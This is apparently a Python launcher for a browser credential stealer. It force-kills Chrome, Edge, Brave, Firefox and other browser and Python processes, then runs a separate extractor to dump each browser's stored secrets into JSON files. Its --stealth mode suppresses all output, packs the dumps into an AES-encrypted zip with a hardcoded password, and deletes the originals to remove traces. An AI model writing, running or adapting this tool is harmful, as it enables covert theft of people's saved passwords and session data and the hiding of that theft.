import subprocess
import time
import os
import sys
import argparse

def kill_processes():
    print("[*] Cleaning up background processes...")
    
    # List of processes to kill
    
    targets = [
        "chrome.exe", "msedge.exe", "brave.exe", 
        "firefox.exe", "opera.exe", "vivaldi.exe"
    ]
    
    # Kill browser processes
    for target in targets:
        subprocess.run(f"taskkill /F /IM {target}", shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

    # Kill other python processes, but EXCLUDE the current one (so the script doesn't kill itself)
    current_pid = os.getpid()
    subprocess.run(f'taskkill /F /IM python.exe /FI "PID ne {current_pid}"', shell=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
    
    time.sleep(2)
    print()

def run_extractor(browser, output_file, stealth=False):
    if not stealth:
        print(f"[*] Extracting {browser.capitalize()} Secrets...")
    # Uses the current python interpreter to run main.py
    try:
        cmd = [sys.executable, "main.py", f"/b:{browser}", f"/f:{output_file}"]
        if stealth: cmd.append("--stealth")
        
        if stealth:
            subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        else:
            subprocess.run(cmd, check=True)
    except subprocess.CalledProcessError as e:
        if not stealth:
            print(f"[-] Error running extraction for {browser}: {e}")
    if not stealth: print()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--stealth", action="store_true", help="Run extraction completely in the background, zip and encrypt output.")
    args, unknown = parser.parse_known_args()
    
    if args.stealth:
        sys.stdout = open(os.devnull, 'w')
        sys.stderr = open(os.devnull, 'w')
    kill_processes()
    
    # List of extractions to run
    # add more browsers if needed, these are just common browsers 
    tasks = [
        ("chrome", "dumps/secrets_chrome.json"),
        ("edge", "dumps/secrets_edge.json"),
        ("firefox", "dumps/secrets_firefox.json"),
        ("brave", "dumps/secrets_brave.json")
        # ("opera", "dumps/secrets_opera.json"), 
        # ("vivaldi", "dumps/secrets_vivaldi.json")
    ]
    
    for browser_name, output_file in tasks:
        run_extractor(browser_name, output_file, args.stealth)
        
    if args.stealth:
        try:
            import pyzipper
            zip_path = os.path.join("dumps", "stealth_dump.zip")
            with pyzipper.AESZipFile(zip_path, 'w', compression=pyzipper.ZIP_LZMA, encryption=pyzipper.WZ_AES) as zf:
                zf.setpassword(b"baf_investigator")
                for root, _, files in os.walk("dumps"):
                    for file in files:
                        if file != "stealth_dump.zip" and not file.endswith(".sqlite"):
                            file_path = os.path.join(root, file)
                            zf.write(file_path, arcname=file)
                            try:
                                os.remove(file_path) # Clean up footprints
                            except: pass
        except Exception:
            pass
            
    if not args.stealth:
        print("[+] All Done. Check the json files.")
        try: input("Press Enter to exit...")
        except: pass